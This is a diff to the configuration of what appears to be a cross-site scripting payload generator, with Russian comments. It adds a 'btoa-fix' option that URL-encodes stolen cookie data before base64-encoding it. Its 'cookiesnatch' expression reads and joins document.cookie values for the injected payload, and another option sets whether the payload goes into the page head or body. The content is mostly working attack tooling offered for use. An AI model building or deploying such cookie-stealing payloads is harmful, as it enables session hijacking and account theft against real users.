@@ -52,6 +52,12 @@ arguments:
       - head
     description: вставлять нагрузку в document.head вместо document.body (не применимо к location)
     replacer: '#pos#'
+  btoa-fix:
+    default:
+      - 'N'
+      - 'Y'
+    description: кодировать данные с помощью URL encoding перед отправкой в btoa (применять если на выходе eval есть кириллица)
+    replacer: '#btoa-fix#'
 
 
 mode:
@@ -71,6 +77,11 @@ mode:
       apos: "'"
       quot: '"'
       grave: '`'
+    btoa-fix:
+      N: >-
+        `btoa(document.cookie.match(RegExp(${ENC.cookieRegex},${ENC.g})).join(${ENC.delim}))`;
+      Y: >-
+        `btoa(encodeURIComponent(document.cookie.match(RegExp(${ENC.cookieRegex},${ENC.g})).join(${ENC.delim})))`;
     a:
       img: |-
         var strings = {
@@ -168,7 +179,7 @@ script: |
   // Сборка нагрузки
   all_strings = {...strings, ...bsc_strings};
   ENC = EncodePld(#e#, all_strings);
-  cookiesnatch = `btoa(document.cookie.match(RegExp(${ENC.cookieRegex},${ENC.g})).join(${ENC.delim}))`;
+  cookiesnatch = #btoa-fix#
   payload = eval(`\`${payloadTemplate}\``);
 
   console.log(payload);
